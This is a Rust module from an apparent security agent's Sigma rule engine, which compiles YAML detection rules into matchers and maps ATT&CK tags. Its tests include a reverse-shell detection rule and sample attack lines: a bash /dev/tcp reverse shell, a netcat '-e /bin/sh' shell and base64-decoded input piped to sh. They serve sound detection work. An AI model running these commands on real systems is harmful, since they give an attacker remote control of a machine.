//! Sigma rule data model: YAML deserialization → compiled, match-ready form.
//!
//! We support the common, security-relevant subset of the Sigma specification
//! that maps cleanly onto the agent's event schema:
//!
//!   * `logsource` filtering by `category` / `product`
//!   * named search-identifiers that are either a field/value map (`selection`),
//!     a list of such maps (OR of selections) or a list of scalars (keywords)
//!   * field modifiers `contains`, `startswith`, `endswith`, `re`, `cased`,
//!     `all` (and combinations like `CommandLine|contains|all`)
//!   * value lists (OR by default, AND with `|all`)
//!   * a `condition` expression over the search-identifiers (see
//!     [`super::condition`])
//!
//! Matching is case-insensitive by default (Sigma semantics); `|cased` opts a
//! field into case-sensitive comparison.

use std::collections::BTreeMap;

use anyhow::{anyhow, bail, Context, Result};
use regex::Regex;
use serde::Deserialize;

use crate::schema::Severity;

use super::condition::ConditionExpr;

/// Raw Sigma rule exactly as written in YAML.
#[derive(Debug, Deserialize)]
pub struct RawRule {
    pub title: String,
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    #[allow(dead_code)] // parsed for completeness; not used in matching
    pub status: Option<String>,
    #[serde(default)]
    pub level: Option<String>,
    #[serde(default)]
    #[allow(dead_code)] // parsed for completeness; not used in matching
    pub description: Option<String>,
    #[serde(default)]
    pub logsource: RawLogSource,
    pub detection: BTreeMap<String, serde_yaml_ng::Value>,
    #[serde(default)]
    pub tags: Vec<String>,
}

#[derive(Debug, Default, Deserialize)]
pub struct RawLogSource {
    #[serde(default)]
    pub category: Option<String>,
    #[serde(default)]
    pub product: Option<String>,
    #[serde(default)]
    #[allow(dead_code)] // logsource.service is parsed but not used for gating yet
    pub service: Option<String>,
}

/// How a single value pattern is compared against a field value.
#[derive(Debug, Clone)]
pub enum MatchKind {
    Equals,
    Contains,
    StartsWith,
    EndsWith,
    Regex(Box<Regex>),
}

/// One value pattern plus its comparison kind and case sensitivity.
#[derive(Debug, Clone)]
pub struct ValuePattern {
    pub kind: MatchKind,
    /// Pre-lowered needle for case-insensitive kinds (ignored for `Regex`).
    pub needle: String,
    pub cased: bool,
}

impl ValuePattern {
    /// Does this pattern match `haystack`?
    pub fn matches(&self, haystack: &str) -> bool {
        match &self.kind {
            MatchKind::Regex(re) => re.is_match(haystack),
            other => {
                let hay = if self.cased { haystack.to_string() } else { haystack.to_ascii_lowercase() };
                let needle = &self.needle;
                match other {
                    MatchKind::Equals => &hay == needle,
                    MatchKind::Contains => hay.contains(needle.as_str()),
                    MatchKind::StartsWith => hay.starts_with(needle.as_str()),
                    MatchKind::EndsWith => hay.ends_with(needle.as_str()),
                    MatchKind::Regex(_) => unreachable!(),
                }
            }
        }
    }
}

/// A single `Field|mods: value(s)` entry compiled to a field name plus a set of
/// value patterns. `all` requires *every* pattern to match (AND); otherwise any
/// one is enough (OR).
#[derive(Debug, Clone)]
pub struct FieldMatcher {
    /// Lower-cased field name for case-insensitive field lookup.
    pub field: String,
    pub patterns: Vec<ValuePattern>,
    pub require_all: bool,
    /// `field|exists` style negation is not supported; `null` value means the
    /// field must be absent/empty.
    pub match_null: bool,
}

impl FieldMatcher {
    /// Evaluate this matcher against the event's values for the field. A field
    /// can be multi-valued (e.g. DNS resolved IPs); a pattern matches the field
    /// if it matches *any* of the values.
    pub fn matches(&self, values: &[String]) -> bool {
        if self.match_null {
            return values.is_empty() || values.iter().all(|v| v.is_empty());
        }
        if values.is_empty() {
            return false;
        }
        if self.require_all {
            self.patterns
                .iter()
                .all(|p| values.iter().any(|v| p.matches(v)))
        } else {
            self.patterns
                .iter()
                .any(|p| values.iter().any(|v| p.matches(v)))
        }
    }
}

/// A named search-identifier in the `detection:` block.
#[derive(Debug, Clone)]
pub enum Search {
    /// A field/value map — every field matcher must hold (AND).
    Selection(Vec<FieldMatcher>),
    /// A list of selections — any one matching is enough (OR).
    AnyOf(Vec<Vec<FieldMatcher>>),
    /// A keyword list matched against the event's full-text projection (OR).
    Keywords(Vec<ValuePattern>),
}

impl Search {
    pub fn matches(&self, fields: &super::fields::FieldView) -> bool {
        match self {
            Search::Selection(ms) => ms.iter().all(|m| m.matches(fields.get(&m.field))),
            Search::AnyOf(groups) => groups
                .iter()
                .any(|g| g.iter().all(|m| m.matches(fields.get(&m.field)))),
            Search::Keywords(pats) => {
                let text = fields.full_text();
                pats.iter().any(|p| p.matches(text))
            }
        }
    }
}

/// A fully compiled, match-ready Sigma rule.
#[derive(Debug, Clone)]
pub struct CompiledRule {
    pub title: String,
    pub id: Option<String>,
    pub level: Severity,
    pub category: Option<String>,
    pub product: Option<String>,
    pub searches: BTreeMap<String, Search>,
    pub condition: ConditionExpr,
    pub tags: Vec<String>,
    /// First `attack.tNNNN[.NNN]` tag, upper-cased (e.g. `T1059.004`).
    pub mitre_technique: Option<String>,
    /// First `attack.<tactic>` tag mapped to an ATT&CK tactic id.
    pub mitre_tactic: Option<String>,
}

/// Map a Sigma `level` to the agent severity ladder.
fn level_to_severity(level: Option<&str>) -> Severity {
    match level.unwrap_or("medium").to_ascii_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        "low" => Severity::Low,
        _ => Severity::Info,
    }
}

/// Extract `(technique, tactic)` from Sigma `attack.*` tags.
fn parse_mitre(tags: &[String]) -> (Option<String>, Option<String>) {
    let mut technique = None;
    let mut tactic = None;
    for t in tags {
        let lt = t.to_ascii_lowercase();
        let suffix = lt.strip_prefix("attack.").unwrap_or(&lt);
        // Technique ids look like t1059 or t1059.004.
        if technique.is_none()
            && suffix.starts_with('t')
            && suffix[1..].chars().next().is_some_and(|c| c.is_ascii_digit())
        {
            technique = Some(suffix.to_ascii_uppercase());
        } else if tactic.is_none() && !suffix.is_empty() && !suffix.starts_with('t') {
            tactic = Some(tactic_id(suffix));
        }
    }
    (technique, tactic)
}

/// Map a Sigma tactic tag (`credential_access`) to its ATT&CK id (`TA0006`).
fn tactic_id(name: &str) -> String {
    let id = match name.replace('-', "_").as_str() {
        "reconnaissance" => "TA0043",
        "resource_development" => "TA0042",
        "initial_access" => "TA0001",
        "execution" => "TA0002",
        "persistence" => "TA0003",
        "privilege_escalation" => "TA0004",
        "defense_evasion" => "TA0005",
        "credential_access" => "TA0006",
        "discovery" => "TA0007",
        "lateral_movement" => "TA0008",
        "collection" => "TA0009",
        "command_and_control" => "TA0011",
        "exfiltration" => "TA0010",
        "impact" => "TA0040",
        _ => return name.to_string(),
    };
    id.to_string()
}

/// Compile one raw value (scalar or list) for a field key into patterns.
fn compile_patterns(
    raw: &serde_yaml_ng::Value,
    mods: &[&str],
) -> Result<(Vec<ValuePattern>, bool, bool)> {
    let cased = mods.contains(&"cased");
    let require_all = mods.contains(&"all");
    let is_re = mods.contains(&"re");
    let kind_of = |s: &str| -> Result<MatchKind> {
        if is_re {
            return Ok(MatchKind::Regex(Box::new(
                Regex::new(s).with_context(|| format!("invalid regex: {s}"))?,
            )));
        }
        Ok(if mods.contains(&"contains") {
            MatchKind::Contains
        } else if mods.contains(&"startswith") {
            MatchKind::StartsWith
        } else if mods.contains(&"endswith") {
            MatchKind::EndsWith
        } else {
            MatchKind::Equals
        })
    };

    let mut out = Vec::new();
    let mut match_null = false;
    let push = |v: &serde_yaml_ng::Value, out: &mut Vec<ValuePattern>| -> Result<()> {
        let s = yaml_scalar(v)?;
        let needle = if cased { s.clone() } else { s.to_ascii_lowercase() };
        out.push(ValuePattern { kind: kind_of(&s)?, needle, cased });
        Ok(())
    };

    match raw {
        serde_yaml_ng::Value::Null => match_null = true,
        serde_yaml_ng::Value::Sequence(seq) => {
            for v in seq {
                if v.is_null() {
                    match_null = true;
                } else {
                    push(v, &mut out)?;
                }
            }
        }
        scalar => push(scalar, &mut out)?,
    }
    Ok((out, require_all, match_null))
}

/// Coerce a YAML scalar to a string (numbers/bools become their text form).
fn yaml_scalar(v: &serde_yaml_ng::Value) -> Result<String> {
    Ok(match v {
        serde_yaml_ng::Value::String(s) => s.clone(),
        serde_yaml_ng::Value::Number(n) => n.to_string(),
        serde_yaml_ng::Value::Bool(b) => b.to_string(),
        other => bail!("unsupported Sigma value (must be scalar): {other:?}"),
    })
}

/// Compile a `selection`-shaped mapping into AND-joined field matchers.
fn compile_selection_map(map: &serde_yaml_ng::Mapping) -> Result<Vec<FieldMatcher>> {
    let mut matchers = Vec::new();
    for (k, v) in map {
        let key = k
            .as_str()
            .ok_or_else(|| anyhow!("Sigma field key must be a string"))?;
        let parts: Vec<&str> = key.split('|').collect();
        let field = parts[0].to_ascii_lowercase();
        let mods: Vec<&str> = parts[1..].to_vec();
        let (patterns, require_all, match_null) = compile_patterns(v, &mods)?;
        matchers.push(FieldMatcher { field, patterns, require_all, match_null });
    }
    Ok(matchers)
}

/// Compile one search-identifier value (map | list-of-maps | scalar list).
fn compile_search(v: &serde_yaml_ng::Value) -> Result<Search> {
    match v {
        serde_yaml_ng::Value::Mapping(m) => Ok(Search::Selection(compile_selection_map(m)?)),
        serde_yaml_ng::Value::Sequence(seq) => {
            // A sequence is either a list of maps (OR of selections) or a list
            // of scalars (keywords).
            if seq.iter().all(|e| e.is_mapping()) {
                let mut groups = Vec::new();
                for e in seq {
                    if let serde_yaml_ng::Value::Mapping(m) = e {
                        groups.push(compile_selection_map(m)?);
                    }
                }
                Ok(Search::AnyOf(groups))
            } else {
                let (patterns, _, _) = compile_patterns(v, &["contains"])?;
                Ok(Search::Keywords(patterns))
            }
        }
        scalar => {
            let (patterns, _, _) = compile_patterns(scalar, &["contains"])?;
            Ok(Search::Keywords(patterns))
        }
    }
}

impl CompiledRule {
    /// Compile a raw, YAML-parsed rule.
    pub fn compile(raw: RawRule) -> Result<Self> {
        // Pull the condition out of the detection block; everything else is a
        // named search-identifier.
        let cond_val = raw
            .detection
            .get("condition")
            .ok_or_else(|| anyhow!("rule '{}' has no detection.condition", raw.title))?;
        let condition_str = match cond_val {
            serde_yaml_ng::Value::String(s) => s.clone(),
            serde_yaml_ng::Value::Sequence(seq) => {
                // Multiple conditions are OR'd together.
                let parts: Vec<String> = seq
                    .iter()
                    .filter_map(|v| v.as_str().map(|s| format!("({s})")))
                    .collect();
                parts.join(" or ")
            }
            other => bail!("rule '{}' has a non-string condition: {other:?}", raw.title),
        };
        let condition = ConditionExpr::parse(&condition_str)
            .with_context(|| format!("rule '{}' condition parse failed", raw.title))?;

        let mut searches = BTreeMap::new();
        for (name, val) in &raw.detection {
            if name == "condition" {
                continue;
            }
            let s = compile_search(val)
                .with_context(|| format!("rule '{}' search '{}' compile failed", raw.title, name))?;
            searches.insert(name.clone(), s);
        }
        if searches.is_empty() {
            bail!("rule '{}' has no search-identifiers", raw.title);
        }

        let (mitre_technique, mitre_tactic) = parse_mitre(&raw.tags);

        Ok(CompiledRule {
            title: raw.title,
            id: raw.id,
            level: level_to_severity(raw.level.as_deref()),
            category: raw.logsource.category.map(|c| c.to_ascii_lowercase()),
            product: raw.logsource.product.map(|p| p.to_ascii_lowercase()),
            searches,
            condition,
            tags: raw.tags,
            mitre_technique,
            mitre_tactic,
        })
    }

    /// Parse + compile a single rule from a YAML document string.
    #[allow(dead_code)] // convenience constructor used in tests
    pub fn from_yaml(doc: &str) -> Result<Self> {
        let raw: RawRule = serde_yaml_ng::from_str(doc).context("invalid Sigma YAML")?;
        Self::compile(raw)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn compiles_basic_rule_and_extracts_mitre() {
        let doc = r#"
title: Bash Reverse Shell
id: 11111111-1111-1111-1111-111111111111
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/bash'
    CommandLine|contains:
      - '/dev/tcp/'
      - '-i'
  condition: selection
tags:
  - attack.execution
  - attack.t1059.004
"#;
        let r = CompiledRule::from_yaml(doc).unwrap();
        assert_eq!(r.title, "Bash Reverse Shell");
        assert_eq!(r.level, Severity::High);
        assert_eq!(r.category.as_deref(), Some("process_creation"));
        assert_eq!(r.mitre_technique.as_deref(), Some("T1059.004"));
        assert_eq!(r.mitre_tactic.as_deref(), Some("TA0002"));
        assert!(r.searches.contains_key("selection"));
    }

    #[test]
    fn value_pattern_modifiers_work() {
        let ends = ValuePattern { kind: MatchKind::EndsWith, needle: "/bash".into(), cased: false };
        assert!(ends.matches("/usr/bin/bash"));
        assert!(!ends.matches("/usr/bin/dash"));

        let contains = ValuePattern { kind: MatchKind::Contains, needle: "/dev/tcp/".into(), cased: false };
        assert!(contains.matches("bash -i >& /dev/TCP/10.0.0.1/4444 0>&1"));

        let re = ValuePattern {
            kind: MatchKind::Regex(Box::new(Regex::new(r"nc(\.traditional)? -e").unwrap())),
            needle: String::new(),
            cased: false,
        };
        assert!(re.matches("nc -e /bin/sh 10.0.0.1 9001"));
        assert!(re.matches("nc.traditional -e /bin/sh"));
    }

    #[test]
    fn field_matcher_all_requires_every_pattern() {
        let m = FieldMatcher {
            field: "commandline".into(),
            patterns: vec![
                ValuePattern { kind: MatchKind::Contains, needle: "base64".into(), cased: false },
                ValuePattern { kind: MatchKind::Contains, needle: "decode".into(), cased: false },
            ],
            require_all: true,
            match_null: false,
        };
        assert!(m.matches(&["echo x | base64 --decode | sh".into()]));
        assert!(!m.matches(&["echo base64".into()]));
    }
}
